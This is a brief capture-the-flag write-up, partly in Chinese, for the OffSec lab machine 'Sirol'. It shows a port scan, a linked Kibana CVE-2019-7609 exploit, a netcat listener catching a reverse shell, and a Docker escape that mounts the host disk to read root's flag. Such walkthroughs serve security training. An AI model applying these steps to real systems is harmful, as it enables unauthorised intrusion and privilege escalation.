###### tags: `Offsec` `PG Practice` `Hard` `Linux`

# Sirol
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.172.54 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.172.54:22
Open 192.168.172.54:80
Open 192.168.172.54:3306
Open 192.168.172.54:5601
Open 192.168.172.54:24007

PORT      STATE SERVICE   REASON  VERSION
22/tcp    open  ssh       syn-ack OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
80/tcp    open  http      syn-ack Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: PHP Calculator
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
3306/tcp  open  mysql     syn-ack MariaDB (unauthorized)
5601/tcp  open  esmagent? syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     HTTP/1.1 400 Bad Request
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     kbn-name: kibana
|     kbn-xpack-sig: 79b8a7336823018e37a1e121a9f3bb67
|     content-type: application/json; charset=utf-8
|     cache-control: no-cache
|     content-length: 60
|     connection: close
|     Date: Fri, 26 Apr 2024 06:55:40 GMT
|     {"statusCode":404,"error":"Not Found","message":"Not Found"}
|   GetRequest: 
|     HTTP/1.1 302 Found
|     location: /app/kibana
|     kbn-name: kibana
|     kbn-xpack-sig: 79b8a7336823018e37a1e121a9f3bb67
|     cache-control: no-cache
|     content-length: 0
|     connection: close
|     Date: Fri, 26 Apr 2024 06:55:38 GMT
|   HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     kbn-name: kibana
|     kbn-xpack-sig: 79b8a7336823018e37a1e121a9f3bb67
|     content-type: application/json; charset=utf-8
|     cache-control: no-cache
|     content-length: 38
|     connection: close
|     Date: Fri, 26 Apr 2024 06:55:38 GMT
|_    {"statusCode":404,"error":"Not Found"}
24007/tcp open  rpcbind   syn-ack
```

搜尋[CVE-2019-7609](https://github.com/LandGrey/CVE-2019-7609/blob/master/CVE-2019-7609-kibana-rce.py)，使用後可在`/home/trent`得local.txt
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp22

root@0873e8062560:/home/trent# cat local.txt
8ea2791deee0af90d2c6a36f45e4234d
```

查看`ls -al`，可以發現環境是docker
```
root@0873e8062560:/# ls -al
ls -al
total 76
drwxr-xr-x   1 root root 4096 Jun 10  2020 .
drwxr-xr-x   1 root root 4096 Jun 10  2020 ..
-rwxr-xr-x   1 root root    0 Jun 10  2020 .dockerenv
...
```

利用[Docker Breakout / Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation#privileged)，`fdisk -l`可以用
```
root@0873e8062560:/# fdisk -l
Disk /dev/sda: 20 GiB, 21474836480 bytes, 41943040 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x16939df4

Device     Boot    Start      End  Sectors Size Id Type
/dev/sda1  *        2048 37750783 37748736  18G 83 Linux
/dev/sda2       37752830 41940991  4188162   2G  5 Extended
/dev/sda5       37752832 41940991  4188160   2G 82 Linux swap / Solaris

root@0873e8062560:/# mkdir -p /mnt/hola
root@0873e8062560:/# mount /dev/sda1 /mnt/hola
```

掛起來之後可以到/root得到proof.txt
```
root@0873e8062560:/mnt/hola/root# cat proof.txt
b8ff6b102ed4c154f32f53e54f2fa4b5
```